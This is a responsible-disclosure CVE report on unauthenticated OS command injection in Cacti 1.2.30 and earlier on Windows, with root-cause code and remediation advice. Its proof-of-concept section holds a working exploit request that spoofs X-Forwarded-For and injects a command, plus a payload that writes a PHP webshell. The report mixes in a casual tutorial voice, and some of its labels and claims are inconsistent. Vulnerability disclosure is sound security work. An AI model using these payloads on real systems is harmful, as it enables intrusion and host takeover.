CVE SUBMISSION REPORT — Cacti ≤ 1.2.30 : Unauthenticated RCE on Windows
CONFIDENTIAL — RESPONSIBLE DISCLOSURE Page 1 of 5
CVE SUBMISSION REPORT
Unauthenticated RCE (Windows) in Cacti ≤ 1.2.30
Broken Shell Escaping (cmd.exe) + Auth Bypass → OS Command Injection via graph_json
Product Cacti Network Monitoring Application
Affected Versions ≤ 1.2.30 (Confirmed on Windows deployment)
CVE ID Pending — Submission in Progress
Vulnerability Type OS Command Injection (CWE-78)
Secondary CWE CWE-290: Authentication Bypass by Spoofing
CVSS v3.1 Score 10.0 CRITICAL — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Auth Required None (Unauthenticated)
Target Platform Windows (Primary) — cmd.exe specific
Affected Endpoint GET /remote_agent.php?action=graph_json
Affected Parameter graph_start
Disclosure Type Coordinated Responsible Disclosure (90-day)
1. Executive Summary
A critical, unauthenticated Remote Code Execution (RCE) vulnerability has been identified in Cacti
version 1.2.30 and earlier when deployed on Windows operating systems. The vulnerability is the
product of two weaknesses that chain into a complete pre-authentication OS command injection
primitive.
First, remote_agent.php authorises polling clients by IP address using the get_client_addr()
function, which blindly trusts attacker-supplied HTTP proxy headers such as X-Forwarded-For.
Second, the custom cacti_escapeshellarg() function on Windows produces output that cmd.exe does
not interpret as a single quoted argument, allowing an attacker to break out and inject arbitrary shell
commands.
The attack is triggered via a single unauthenticated HTTP GET request to the graph_json action,
injecting a payload into the graph_start parameter. No credentials, privileges, or user interaction are
required. The result is complete compromise of the Windows host.
2. Root Cause Analysis
2.A Broken Windows Shell Escaping — lib/functions.php
CVE SUBMISSION REPORT — Cacti ≤ 1.2.30 : Unauthenticated RCE on Windows
CONFIDENTIAL — RESPONSIBLE DISCLOSURE Page 2 of 5
Affected function: cacti_escapeshellarg()
The custom escaping function attempts to make arguments safe for all platforms. On Linux, it correctly
delegates to PHP’s built-in escapeshellarg(). On Windows, however, it uses a hand-rolled
implementation that wraps the argument in double quotes and replaces " with \".
Vulnerable Code (lib/functions.php)
PHP
function cacti_escapeshellarg($arg) {
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
 // ❌ BROKEN: backslash is NOT a quote-escape character in cmd.exe
 return '"' . str_replace('"', '\\"', $arg) . '"';
 } else {
 return escapeshellarg($arg); // Linux: safe
 }
}
Technical Flaw Analysis
The Windows command processor cmd.exe does not recognise \" as an escaped double quote inside
a double-quoted string. Instead, it treats the backslash as a literal character and the following " as the
closing delimiter of the quoted argument.
Injection example with payload a" & whoami & ":
cmd.exe tokenisation
Input arg: a" & whoami & "
After function: "a\" & whoami & \""
cmd.exe parsing:
 Token 1 (quoted): "a\" → rrdtool.exe receives: a\
 Token 2 (bare): & whoami & → cmd.exe executes: whoami
 Token 3 (quoted): "" → ignored
2.B Authentication Bypass via IP Spoofing — remote_agent.php
The remote_client_authorized() function in remote_agent.php restricts access to registered pollers
by resolving the client address with get_client_addr(). This function iterates through a set of proxy
headers without validating the source, allowing any remote client to impersonate 127.0.0.1 or any
other registered poller.
Vulnerable Code (remote_agent.php)
PHP
function remote_client_authorized() {
 $client_addr = get_client_addr();
 // ↑ reads X-Forwarded-For, HTTP_CLIENT_IP without validation
 foreach ($pollers as $poller) {
 if ($poller['hostname'] == $client_addr) {
 return true; // ← no cryptographic proof required
 }
 }
}
2.C Execution Sink — graph_json → rrdtool
The graph_json action at line 189 of remote_agent.php retrieves the graph_start parameter raw and
passes it through the broken escaping function into proc_open() via the rrdtool execution path.
CVE SUBMISSION REPORT — Cacti ≤ 1.2.30 : Unauthenticated RCE on Windows
CONFIDENTIAL — RESPONSIBLE DISCLOSURE Page 3 of 5
Vulnerable Execution Flow
PHP execution chain
// Step 1 — remote_agent.php:189
$graph_data_array['graph_start'] = get_request_var('graph_start');
// ↑ No integer validation — raw string accepted
// Step 2 — rrdtool_function_graph()
$cmd .= ' --start=' . cacti_escapeshellarg($graph_data_array['graph_start']);
// ↑ Broken escaping applied
// Step 3 — __rrd_execute()
proc_open($cmd, ...);
// ↑ Final command string passed to cmd.exe — injection executes
3. Proof of Concept
3.1 Prerequisites
• Target running Cacti ≤ 1.2.30 on a Windows server.
• At least one graph and poller configured (default installation state).
• Network access to the Cacti web interface — no account required.
3.2 Step-by-Step Exploitation
1. Spoof an authorised poller IP using the X-Forwarded-For header set to 127.0.0.1.
2. Inject a command breakout payload into the graph_start GET parameter targeting the
graph_json action.
3. The server passes the unsanitised value through cacti_escapeshellarg() and into
proc_open().
4. cmd.exe tokenises the broken argument string, executing the injected command.
3.3 PoC HTTP Request
HTTP GET
GET
/remote_agent.php?action=graph_json&local_graph_id=1&graph_start=a"%20%26%20whoami%20%26%2
0" HTTP/1.1
Host: TARGET_IP
X-Forwarded-For: 127.0.0.1
Connection: close
Once you are inside, you send a specially crafted URL: GET
/remote_agent.php?action=graph_json&local_graph_id=1&graph_start=a" & whoami & "
Here is what that weird graph_start value actually does:
1. a": The first part of the command starts with a double quote. Our " closes that quote early.
2. &: In Windows CMD, the & symbol means "Stop the current command and start a new one."
3. whoami: This is your malicious command. Because you used the &, Windows will now execute
this.
4. & ": This starts a third dummy command and adds a final quote to "clean up" the string so Cacti
doesn't realize anything is wrong.
3.4 Resulting Command on the Server
CVE SUBMISSION REPORT — Cacti ≤ 1.2.30 : Unauthenticated RCE on Windows
CONFIDENTIAL — RESPONSIBLE DISCLOSURE Page 4 of 5
cmd.exe
// What Cacti builds:
rrdtool.exe graph - --start="a\" & whoami & \""
// What cmd.exe executes (three tokens):
 [1] rrdtool.exe ... --start="a\"
 [2] whoami ← attacker-controlled command
 [3] \"\" ← trailing garbage (ignored)
When the Windows server receives your request, it tries to run a legitimate command like rrdtool.exe.
Because of our injection, the server actually runs:
rrdtool.exe --start="a\" & whoami & \""
Because of the bug in Cacti's code, the \" (which should have protected the string) doesn't work. The
Windows Command Prompt sees three separate instructions:
1. rrdtool.exe --start="a\" (This fails silently)
2. whoami (This executes with system privileges!)
3. \"" (This is ignored)
3.5 Reverse Shell Payload (Full RCE)
Payload
simpler — write webshell to disk:
a" & echo ^<?php system($_GET['cmd']); ?^> > C:\inetpub\wwwroot\cacti\shell.php & "
4. Impact Analysis
Dimension Rating Description
Confidentiality HIGH Full read access to database credentials, SNMP strings, API
keys, monitored host data, and Windows file system.
Integrity HIGH Arbitrary file write — enables persistent webshell, modification of
Cacti config, poller scripts, and OS files.
Availability HIGH Service termination, resource exhaustion, ransomware
deployment, and complete host takeover.
Scope CHANGED Cacti monitors the network infrastructure — compromise
enables lateral movement to all monitored hosts.
5. CVSS v3.1 Scoring
Vector String
CVSS
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Base Score: 10.0 — CRITICAL
CVE SUBMISSION REPORT — Cacti ≤ 1.2.30 : Unauthenticated RCE on Windows
CONFIDENTIAL — RESPONSIBLE DISCLOSURE Page 5 of 5
6. Remediation Recommendations
• Immediate Fix: Replace the custom cacti_escapeshellarg() for Windows with a robust
implementation or use the native escapeshellarg() if possible (though it also has historical
issues on Windows).
• Validation: Enforce strict integer validation on the graph_start and graph_end parameters using
FILTER_VALIDATE_INT before they reach the shell execution layer.
7. References
• Cacti Official Site — https://cacti.net
• CWE-78: OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
• CWE-290: Authentication Bypass by Spoofing — https://cwe.mitre.org/data/definitions/290.html
• OWASP: OS Command Injection — https://owasp.org/wwwcommunity/attacks/Command_Injection
• Microsoft: cmd.exe Command Parsing — https://docs.microsoft.com/en-us/windowsserver/administration/windows-commands/cmd
• MITRE CVE Request Form — https://cveform.mitre.org/
• FIRST CVSS v3.1 Specification — https://www.first.org/cvss/v3.1/specification-document
8. Researcher Information
Name / Handle MENG HOKSENG
Email Hokseng.meng@student.cadt.edu.kh
GitHub https://github.com/celeboy711-hue
This report is submitted in good faith. The researcher requests a 90-day coordinated remediation window before any
public disclosure. The researcher will not publish exploit code until a patch is available.
